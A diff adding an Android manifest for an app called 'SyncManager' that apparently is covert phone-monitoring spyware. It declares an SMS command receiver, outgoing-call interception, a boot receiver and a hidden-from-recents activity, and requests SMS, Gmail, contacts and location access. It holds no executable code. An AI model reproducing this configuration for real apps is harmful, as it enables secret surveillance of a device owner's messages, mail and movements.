@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.vvt.android.syncmanager">
+    <application android:icon="@drawable/application" android:label="SyncManager">
+        <activity android:excludeFromRecents="true" android:finishOnTaskLaunch="true" android:label="@string/app_name" android:name=".SyncManagerActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Light">
+            <intent-filter>
+                <action android:name="com.vvt.android.syncmanager.SyncManagerActivity"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:name=".gui.EventsSettingsActivity" android:screenOrientation="portrait"/>
+        <activity android:label="@string/language_ui_label_connection_history" android:name=".gui.ConnectionHistoryActivity" android:screenOrientation="portrait"/>
+        <activity android:label="@string/language_ui_label_cache_database_status" android:name=".gui.DatabaseStatusActivity" android:screenOrientation="portrait"/>
+        <receiver android:name=".receivers.SmsCommandReceiver">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".receivers.FlexiKeyReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".receivers.SystemState">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <provider android:authorities="com.fx.dalvik.eventdb" android:name="com.fx.dalvik.eventdb.EventProvider"/>
+        <provider android:authorities="com.fx.dalvik.preference" android:name="com.fx.dalvik.preference.PreferenceProvider"/>
+        <service android:name=".service.EventMonitorService"/>
+        <service android:name=".service.SchedulerService"/>
+    </application>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCOUNT_MANAGER"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
+    <uses-permission android:name="com.google.android.providers.gmail.permission.READ_GMAIL"/>
+    <uses-permission android:name="com.google.android.providers.gmail.permission.WRITE_GMAIL"/>
+    <uses-permission android:name="com.google.android.gm.permission.READ_GMAIL"/>
+    <uses-permission android:name="com.google.android.gm.permission.WRITE_GMAIL"/>
+</manifest>
